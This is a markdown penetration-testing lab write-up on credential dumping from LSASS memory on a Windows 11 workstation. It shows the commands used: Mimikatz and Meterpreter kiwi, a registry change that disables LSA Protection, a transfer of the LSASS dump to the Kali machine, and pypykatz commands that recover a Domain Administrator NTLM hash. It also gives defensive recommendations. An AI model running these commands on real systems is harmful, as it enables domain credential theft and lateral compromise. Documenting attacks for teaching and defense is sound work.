# Credential Access

## Objective

Extract credential material cached in memory on the compromised Windows 11 workstation, specifically targeting any privileged domain account that had previously logged on interactively to the machine.

## Source of Credential Material

A Domain Administrator account had, prior to this stage, logged on interactively to the Windows 11 workstation (simulating a realistic scenario such as an IT administrator troubleshooting a user's machine). This left the account's authentication material cached in the Local Security Authority Subsystem Service (LSASS) process memory.

## Technique Used

Credential dumping from LSASS process memory (MITRE ATT&CK T1003.001 — OS Credential Dumping: LSASS Memory).

Two approaches were attempted, in order:

1. **Live in-memory extraction** using Mimikatz — both via Meterpreter's built-in `kiwi` extension and a standalone Mimikatz binary.
2. **Offline extraction** — used after live extraction was blocked by modern Windows credential-protection features (LSA Protection / Credential Guard). A full memory dump of the LSASS process was created using native Windows tooling, transferred to the Kali attacker platform, and parsed offline using `pypykatz`.

## Attack Execution

### Attempt 1 — Live Extraction via Meterpreter `kiwi`

From the SYSTEM-level session obtained in Phase 2:

```
meterpreter > load kiwi
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
[*] No credentials seen
```

Attempted debug privilege escalation directly:

```
meterpreter > kiwi_cmd privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

**Root cause investigation:** `sysinfo` confirmed the session was already native x64 (ruling out a WOW64/architecture mismatch). Checking LSA Protection status revealed the actual cause:

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
RunAsPPL    REG_DWORD    0x2
```

`RunAsPPL = 0x2` indicates LSA is running as a Protected Process Light (PPL) at the strictest, Secure-Boot-backed level, blocking privilege adjustment against LSASS even from a SYSTEM context.

**Remediation attempt (lab configuration change):**

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
shutdown /r /t 0
```

After reboot and re-establishing the Phase 1 → Phase 2 session chain, `RunAsPPL` was confirmed at `0x0`, but credential retrieval still failed at the next stage:

```
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

### Attempt 2 — Standalone Mimikatz Binary

To rule out a `kiwi`-specific implementation issue, a standalone, current-release Mimikatz binary was used instead:

```
meterpreter > upload mimikatz.exe C:\\Windows\\Temp\\mk.exe
meterpreter > shell
C:\> cd C:\Windows\Temp
C:\Windows\Temp> mk.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

This confirmed the block was not `kiwi`-specific, but a deeper OS-level protection (Credential Guard / Virtualization-Based Security) independent of the already-disabled `RunAsPPL` setting.

### Attempt 3 (Successful) — Offline LSASS Memory Dump + Parsing

Rather than continuing to fight in-memory extraction against VBS-backed protections, LSASS memory was dumped to disk using native Windows tooling and parsed offline:

```
[Native Windows dump of the LSASS process to a .dmp file, e.g. via Task Manager
 "Create dump file" on lsass.exe, run with administrative/SYSTEM privileges]
```

The resulting dump file was exfiltrated to the Kali attacker platform via the existing Meterpreter session:

```
meterpreter > download C:\\Windows\\Temp\\lsass.dmp /root/lsass.dmp
```

On Kali, the dump was parsed offline using `pypykatz`:

```bash
pip3 install pypykatz --break-system-packages

pypykatz lsa minidump ~/lsass.dmp
pypykatz lsa minidump ~/lsass.dmp -o ~/lsass_parsed.json
pypykatz lsa minidump ~/lsass.dmp > ~/lsass_parsed.txt

grep -A 10 "Administrator" ~/lsass_parsed.txt
```

## Result

NTLM credential hash material for the Domain Administrator account was successfully recovered via the offline LSASS dump and parsing method, under the `MSV` credential provider section of the `pypykatz` output.

## Security Significance

This confirms that a single interactive logon by a highly privileged account on an ordinary, lower-trust endpoint is sufficient to expose that account's credential material to any attacker who subsequently gains SYSTEM-level access to that endpoint — regardless of the endpoint's own relative unimportance. It also demonstrates that live in-memory protections (LSA Protection, Credential Guard) can be bypassed operationally by pivoting to offline analysis of a raw memory dump, rather than defeating the protection itself.

## Evidence

[`evidence/credential-access.png`](../evidence/credential-access.png)


## Defensive Recommendations

- Enforce a strict administrative tiering model (e.g., Microsoft's tiered administration model) so that privileged domain accounts are never used to log on to standard user workstations.
- Enable and enforce Credential Guard and LSA Protection (`RunAsPPL`) across all endpoints — note that these mitigate live in-memory tooling but do **not** fully prevent offline analysis if an attacker can create and exfiltrate a memory dump, so they should be treated as one layer among several, not a complete control.
- Restrict and monitor process-dumping capabilities and access to `lsass.exe` (e.g., via Attack Surface Reduction rules and EDR behavioral detection of dump-related API calls such as `MiniDumpWriteDump`).
- Use dedicated, hardened Privileged Access Workstations (PAWs) for any task requiring administrative credentials.

> **Note:** No plaintext passwords, real credential values, or reusable secrets are published in this repository. All credential-related evidence is redacted prior to publication.
